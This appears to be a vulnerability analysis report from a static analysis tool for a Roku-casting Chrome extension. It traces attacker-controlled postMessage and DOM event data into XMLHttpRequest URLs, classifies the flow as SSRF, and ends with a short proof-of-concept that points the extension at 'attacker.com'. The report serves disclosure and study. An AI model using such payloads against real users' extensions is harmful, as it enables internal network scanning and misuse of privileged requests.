# CoCo Analysis: glcfcbpnklnoioicglgeagddedkbfbmk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple XMLHttpRequest_url_sink flows (analyzed primary flow)

---

## Sink: cs_window_eventListener_message / document_eventListener_url → XMLHttpRequest_url_sink

**CoCo Trace:**

Primary flow 1 - window.addEventListener message:
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/glcfcbpnklnoioicglgeagddedkbfbmk/opgen_generated_files/cs_0.js
Line 581	window.addEventListener('message', function(event) {
Line 588	  if (event.data.type && (event.data.type == "FROM_TVQUE_FOR_ROKU")) {
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/glcfcbpnklnoioicglgeagddedkbfbmk/opgen_generated_files/bg.js
Line 1078	query_app_withIPAddr(hints.ipaddress, null) ;
Line 1912	glb_dev_url = 'http://'+ip_addr+':8888/';
Line 1907	xhr_get.open('GET', 'http://'+glb_dev_ip+':8060/query/apps', true);
```

Primary flow 2 - document.addEventListener url:
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/glcfcbpnklnoioicglgeagddedkbfbmk/opgen_generated_files/cs_0.js
Line 572	document.addEventListener("url", function(e) {
Line 573	console.log(e.detail);
Line 574	chrome.runtime.sendMessage({url:e.detail});
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/glcfcbpnklnoioicglgeagddedkbfbmk/opgen_generated_files/bg.js
Line 1714	var back_url = glb_dev_url.replace('8888','8060');
Line 1715	xhr_get.open('POST', back_url +'keypress/Back', true);
```

**Code:**

```javascript
// Content script (cs_0.js) - Entry point 1
window.addEventListener('message', function(event) {
  if (event.source != window)
    return;

  if (event.data.type && (event.data.type == "FROM_TVQUE_FOR_ROKU")) {
    port.postMessage(event.data); // ← attacker-controlled data sent to background
    return;
  }

  if (event.source != window || !event.data['from-webpage'] || !event.data['get-user-media-http']) return;
  port.postMessage(event.data['get-user-media-http']);
});

// Content script (cs_0.js) - Entry point 2
document.addEventListener("url", function(e) {
  console.log(e.detail);
  chrome.runtime.sendMessage({url:e.detail}); // ← attacker-controlled url sent to background
})

// Background script (bg.js) - Message handler via port
function portOnMessageHandler(hints) {
  if (hints.text === "LAUNCH_ROKU_TVQUE") {
    query_app_withIPAddr(hints.ipaddress, null); // ← attacker-controlled IP address
    return;
  }
  // ... other handlers
}

// Background script (bg.js) - Vulnerable function
function query_app_withIPAddr(ip_addr, name) {
  glb_dev_url = 'http://'+ip_addr+':8888/'; // ← attacker controls ip_addr
  glb_dev_ip = ip_addr;
  query_app();
}

// Background script (bg.js) - SSRF sink
function query_app() {
  var xhr_get = new XMLHttpRequest();
  xhr_get.onreadystatechange = function() { /* ... */ }
  xhr_get.open('GET', 'http://'+glb_dev_ip+':8060/query/apps', true); // ← SSRF with attacker-controlled IP
  xhr_get.send(null);
}

// Background script (bg.js) - Additional sinks
function backkeypress_app() {
  var xhr_get = new XMLHttpRequest();
  var back_url = glb_dev_url.replace('8888','8060'); // ← uses attacker-controlled glb_dev_url
  xhr_get.open('POST', back_url +'keypress/Back', true); // ← SSRF
  xhr_get.send(null);
}

function takePicture() {
  // ...
  var uploadUrl = glb_dev_url+"cast?n="+filename+"&s="+filesize+"&f="+fileformat+"&o="+offset+"&fs="+tot_filesize+"&p="+partial;
  xhr.open('POST', uploadUrl, true); // ← SSRF with attacker-controlled URL
  // ...
}

function getClientRequest(file, req) {
  var xhr_get = new XMLHttpRequest();
  xhr_get.open('GET', glb_dev_url+req, true); // ← SSRF with attacker-controlled URL
  xhr_get.send(null);
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage / DOM events

**Attack:**

```javascript
// Malicious webpage at www.tvque.com (or any page where content script runs)
// Attack 1: Via window.postMessage
window.postMessage({
  type: "FROM_TVQUE_FOR_ROKU",
  text: "LAUNCH_ROKU_TVQUE",
  ipaddress: "attacker.com" // ← attacker-controlled IP/domain
}, "*");

// This causes the extension to make requests to:
// - http://attacker.com:8060/query/apps
// - http://attacker.com:8060/keypress/Back
// - http://attacker.com:8888/cast?...

// Attack 2: Via custom DOM event
var event = new CustomEvent("url", {
  detail: "http://attacker.com:8888/"
});
document.dispatchEvent(event);
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. A malicious webpage on www.tvque.com (or any matching site per manifest) can cause the extension to make privileged cross-origin XMLHttpRequests to arbitrary attacker-controlled URLs. The attacker can:
1. Scan internal networks (private IP ranges) by controlling the IP address
2. Make requests to localhost services
3. Potentially exfiltrate data by observing request patterns
4. Abuse the extension's <all_urls> permission to access resources that the webpage normally couldn't

The extension accepts IP addresses via postMessage and DOM events, then constructs URLs using these attacker-controlled values for multiple XMLHttpRequest calls without validation.
